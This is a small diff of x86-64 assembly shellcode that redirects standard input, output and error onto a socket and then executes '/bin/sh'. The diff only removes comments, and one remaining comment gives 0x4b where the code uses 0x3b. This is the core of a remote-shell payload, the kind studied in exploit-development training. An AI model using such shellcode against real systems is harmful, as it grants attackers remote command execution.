@@ -22,7 +22,7 @@ loop:	mov al, 33
 	syscall			; DUP2 (rax=33) rdi=oldfd (socket) rsi=newfd
 	inc rsi
 	mov rax,rsi
-	cmp al, 2		; Loop 0,1,2 (stdin, stdout, stderr)
+	cmp al, 2
 	
 	jne loop
 
@@ -34,8 +34,8 @@ loop:	mov al, 33
 	push 	rsp			
 	pop 	rdi			
 	
-	push 	rdx		;env
-	pop 	rsi		;args
+	push 	rdx
+	pop 	rsi	
 	
         mov     al, 0x3b	;EXEC (rax=0x4b) rdi="/bin/sh" rsi=rdx=
         syscall
